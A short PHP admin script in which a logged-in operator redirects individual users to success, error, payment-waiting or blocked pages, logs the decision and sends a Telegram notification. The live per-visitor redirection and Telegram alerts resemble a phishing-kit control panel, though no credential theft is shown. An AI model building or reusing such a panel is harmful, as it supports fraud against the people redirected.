<?php
session_start();
if (!isset($_SESSION['admin_loggedin']) || $_SESSION['admin_loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

$db_file = 'data/users.db';

if (isset($_GET['id'], $_GET['decision'])) {
    $user_id = $_GET['id'];
    $decision = $_GET['decision'];
    
    if (!file_exists($db_file)) {
        header('Location: dashboard.php?error=db_not_found');
        exit;
    }
    
    $users = json_decode(file_get_contents($db_file), true) ?: [];
    
    if (!isset($users[$user_id])) {
        header('Location: dashboard.php?error=user_not_found');
        exit;
    }
    
    // Handle different decisions - FIXED STATUS VALUES
    switch ($decision) {
        case 'success':
            $users[$user_id]['status'] = 'redirected';
            $users[$user_id]['redirect_to'] = 'success.php?user_id=' . urlencode($user_id);
            $users[$user_id]['last_updated'] = time();
            break;
            
        case 'error':
            $users[$user_id]['status'] = 'redirected';
            $users[$user_id]['redirect_to'] = 'error.php?user_id=' . urlencode($user_id);
            $users[$user_id]['last_updated'] = time();
            break;
            
        case 'waiting':
            $users[$user_id]['status'] = 'redirected';
            $users[$user_id]['redirect_to'] = 'waitingPay.php?user_id=' . urlencode($user_id);
            $users[$user_id]['last_updated'] = time();
            break;
            
        case 'block':
            $users[$user_id]['status'] = 'blocked';
            $users[$user_id]['redirect_to'] = 'blocked.php?user_id=' . urlencode($user_id);
            $users[$user_id]['last_updated'] = time();
            break;
            
        case 'refresh':
            $users[$user_id]['last_seen'] = time();
            break;
    }
    
    // Add to history
    $users[$user_id]['history'][] = [
        'time' => time(),
        'action' => 'admin_' . $decision,
        'page' => 'dashboard'
    ];
    
    // Save changes
    file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));
    
    // Send Telegram notification
    sendTelegramNotification($users[$user_id], strtoupper($decision));
}

header('Location: dashboard.php');
exit;

function sendTelegramNotification($user, $action) {
    // ... keep your existing Telegram function exactly as is ...
}
?>
